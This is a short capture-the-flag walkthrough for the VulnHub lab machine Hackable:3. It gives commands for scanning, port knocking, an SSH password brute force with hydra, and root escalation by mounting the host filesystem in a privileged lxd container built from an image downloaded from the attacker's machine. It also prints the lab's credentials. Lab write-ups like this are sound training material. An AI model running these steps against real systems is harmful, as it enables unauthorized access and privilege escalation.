
# Hackable:3 Walkthrough 

**VulnHub Link:** [Hackable:3](https://www.vulnhub.com/entry/hackable-iii,720/)
**Difficulty:** Medium
**Release Date:** 2 Jun 2021


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.139

## 2. Web Enumeration

dirb http://hackable3.com

wordlist.txt found from /backup
1.txt found from /config
2.txt found from /css
3.jpg found /

wget http://192.168.100.140/3.jpg ; steghide extract -sf 3.jpg (no passphrase) --> 65535

knock 192.168.100.140 10000 4444 65535 --> SSH will be open after this command 


## 3.Brute Force

hydra -l jubiscleudo -P wordlist.txt ssh://192.168.100.140 -I


## 4.Privilege Escalation


jubiscleudo:onlymy found

ssh jubiscleudo@192.168.100.140 
cat .user.txt ---> User flag Captured

cd /var/www/html --> cat .backup.config.php ---> hackable_3 user's password found

hackable3:TrOLLED_3

we found out that lxd from id command

in our attacker machine ---> 
git clone https://github.com/saghul/lxd-alpine-builder.git
python3 -m http.server 80

in victim machine --->
wget 192.168.100.140/alpine-v3.13-x86_64-20210218_0139.tar.gz

lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxd init (Press Enter everything)

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

cd /mnt/root/root
cat root.txt

BINGO!!!! Root flag captured.!
